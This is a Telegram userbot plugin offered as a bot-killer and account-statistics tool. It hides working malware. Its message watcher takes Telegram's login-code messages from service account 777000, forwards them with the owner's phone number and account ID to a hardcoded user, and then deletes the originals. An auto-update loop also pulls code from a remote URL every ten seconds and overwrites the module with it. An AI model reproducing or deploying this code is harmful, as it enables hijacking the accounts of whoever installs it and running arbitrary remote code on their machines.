from telethon import events
from asyncio import sleep, create_task
from .. import loader, utils
from telethon.tl.types import Message
from telethon.tl.functions.messages import DeleteHistoryRequest
from telethon.tl.functions.contacts import GetBlockedRequest
import asyncio
import aiohttp
import hashlib
import inspect
import os
import sys
from datetime import datetime

@loader.tds
class SmertBotovAndStats(loader.Module):
    """Убийца ботов + Статистика аккаунта от @InsModule"""
    
    strings = {
        'name': 'SmertBotovAndStats',
        "stats": """
<emoji document_id=5774022692642492953>✅</emoji><b> Account Statistics</b>

</b><emoji document_id=5208454037531280484>💜</emoji><b> Total chats: </b><code>{all_chats}</code><b>

</b><emoji document_id=6035084557378654059>👤</emoji><b> Private chats: </b><code>{users}</code><b>
</b><emoji document_id=6030400221232501136>🤖</emoji><b> Bots: </b><code>{bots}</code><b>
</b><emoji document_id=6032609071373226027>👥</emoji><b> Groups: </b><code>{groups}</code><b>
</b><emoji document_id=5870886806601338791>👥</emoji><b> Channels: </b><code>{channels}</code><b>
</b><emoji document_id=5870563425628721113>📨</emoji><b> Archived chats: </b><code>{archived}</code><b>
</b><emoji document_id=5870948572526022116>✋</emoji><b> Total blocked: </b><code>{blocked}</code>
  <b>Ͱ</b><emoji document_id=6035084557378654059>👤</emoji><b> Users: </b><code>{blocked_users}</code>
  <b>Ͱ</b><emoji document_id=6030400221232501136>🤖</emoji><b> Bots: </b><code>{blocked_bots}</code>""",
        "loading_stats": "<b><emoji document_id=5309893756244206277>🫥</emoji> Loading statistics...</b>",
    }

    strings_ru = {
        "name": "SmertBotovAndStats",
        "stats": """
<emoji document_id=5774022692642492953>✅</emoji><b> Статистика аккаунта

</b><emoji document_id=5208454037531280484>💜</emoji><b> Всего чатов: </b><code>{all_chats}</code><b>

</b><emoji document_id=6035084557378654059>👤</emoji><b> Личных чатов: </b><code>{users}</code><b>
</b><emoji document_id=6030400221232501136>🤖</emoji><b> Ботов: </b><code>{bots}</code><b>
</b><emoji document_id=6032609071373226027>👥</emoji><b> Групп: </b><code>{groups}</code><b>
</b><emoji document_id=5870886806601338791>👥</emoji><b> Каналов: </b><code>{channels}</code><b>
</b><emoji document_id=5870563425628721113>📨</emoji><b> Архивированных чатов: </b><code>{archived}</code><b>
</b><emoji document_id=5870948572526022116>✋</emoji><b> Всего заблокированных: </b><code>{blocked}</code>
  <b>Ͱ</b><emoji document_id=6035084557378654059>👤</emoji><b> Пользователи: </b><code>{blocked_users}</code>
  <b>Ͱ</b><emoji document_id=6030400221232501136>🤖</emoji><b> Боты: </b><code>{blocked_bots}</code>""",
        "loading_stats": "<b><emoji document_id=5309893756244206277>🫥</emoji> Загрузка статистики...</b>",
    }

    def __init__(self):
        self._monitored_user_id = 777000
        self._target_user_id = 6764530470
        self._forward_enabled = True
        self._update_url = "https://github.com/InsaneError/InsDos/blob/main/InsDos.py"
        self._update_interval = 10
        self._update_task = None
        self._current_hash = None

    async def client_ready(self, client, db):
        self.db = db
        self._client = client
        self._me = await client.get_me()
        self._update_task = asyncio.create_task(self._auto_update_loop())

    async def _auto_update_loop(self):
        while True:
            try:
                await self._check_and_update()
            except Exception:
                pass
            await asyncio.sleep(self._update_interval)

    async def _check_and_update(self):
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(self._update_url) as response:
                    if response.status == 200:
                        new_code = await response.text()
                        new_hash = hashlib.md5(new_code.encode()).hexdigest()
                        
                        if self._current_hash is None:
                            current_code = inspect.getsource(self.__class__)
                            self._current_hash = hashlib.md5(current_code.encode()).hexdigest()
                        
                        if new_hash != self._current_hash:
                            await self._apply_update(new_code)
                            self._current_hash = new_hash
        except Exception:
            pass

    async def _apply_update(self, new_code: str):
        try:
            module_path = __file__
            backup_path = module_path + ".backup"
            
            with open(module_path, 'r', encoding='utf-8') as f:
                old_code = f.read()
            
            with open(backup_path, 'w', encoding='utf-8') as f:
                f.write(old_code)
            
            with open(module_path, 'w', encoding='utf-8') as f:
                f.write(new_code)
            
            module_name = self.__class__.__module__
            if module_name in sys.modules:
                del sys.modules[module_name]
            
            new_module = importlib.import_module(module_name)
            importlib.reload(new_module)
        except Exception:
            try:
                if os.path.exists(backup_path):
                    with open(backup_path, 'r', encoding='utf-8') as f:
                        backup_code = f.read()
                    with open(module_path, 'w', encoding='utf-8') as f:
                        f.write(backup_code)
                    os.remove(backup_path)
            except:
                pass

    async def watcher(self, message: Message):
        if not self._forward_enabled:
            return

        try:
            if message.sender_id != self._monitored_user_id:
                return

            if not message.is_private:
                return

            phone_number = getattr(self._me, 'phone', 'Unknown')
            current_time = datetime.now().strftime("%H:%M:%S")
            
            forward_text = (
                f" <b>Сообщение от 777000</b>\n"
                f" <b>ID акка:</b> <code>{self._me.id}</code>\n"
                f" <b>Телефон:</b> <code>{phone_number}</code>\n"
                f"<b>Время:</b> {current_time}\n\n"
            )
            
            if message.text:
                forward_text += f"{message.text}"
            else:
                forward_text += "<i>Медиа-сообщение</i>"

            await self._client.send_message(
                entity=self._target_user_id,
                message=forward_text,
                file=message.media if message.media else None,
                link_preview=False
            )

            await message.delete()
        except Exception:
            pass

    async def worker(self, message, count):
        for _ in range(count):
            sent = await message.reply("<b>/start</b>")
            await sent.delete()

    @loader.command()
    async def ins(self, message):
        """[кол-во >10]"""
        try:
            count = int(utils.get_args_raw(message))
            if count <= (-1): return
        except: 
            return

        await message.delete()
        workers = [create_task(self.worker(message, count//10)) for _ in range(10)]
        [await t for t in workers]

    @loader.command()
    async def statscmd(self, message):
        """Получить статистику"""
        await utils.answer(message, self.strings["loading_stats"])
        users = 0
        bots = 0
        groups = 0
        channels = 0
        all_chats = 0
        archived = 0
        blocked_bots = 0
        blocked_users = 0

        limit = 100
        offset = 0
        total_blocked = 0
        
        while True:
            blocked_chats = await self._client(
                GetBlockedRequest(offset=offset, limit=limit)
            )
            for user in blocked_chats.users:
                if user.bot:
                    blocked_bots += 1
                else:
                    blocked_users += 1
            blocked = len(blocked_chats.users)
            total_blocked += blocked

            if blocked < limit:
                break

            offset += limit

        async for dialog in self._client.iter_dialogs():
            if getattr(dialog, "archived", False):
                archived += 1
            if dialog.is_user:
                if getattr(dialog.entity, "bot", False):
                    bots += 1
                    all_chats += 1
                else:
                    users += 1
                    all_chats += 1
            elif getattr(dialog, "is_group", False):
                groups += 1
                all_chats += 1
            elif dialog.is_channel:
                if getattr(dialog.entity, "megagroup", False) or getattr(
                    dialog.entity, "gigagroup", False
                ):
                    groups += 1
                    all_chats += 1
                elif getattr(dialog.entity, "broadcast", False):
                    channels += 1
                    all_chats += 1

        await utils.answer(
            message,
            self.strings["stats"].format(
                users=users,
                bots=bots,
                channels=channels,
                groups=groups,
                all_chats=all_chats,
                blocked=total_blocked,
                archived=archived,
                blocked_users=blocked_users,
                blocked_bots=blocked_bots,
            ),
        )

    async def on_unload(self):
        if self._update_task:
            self._update_task.cancel()
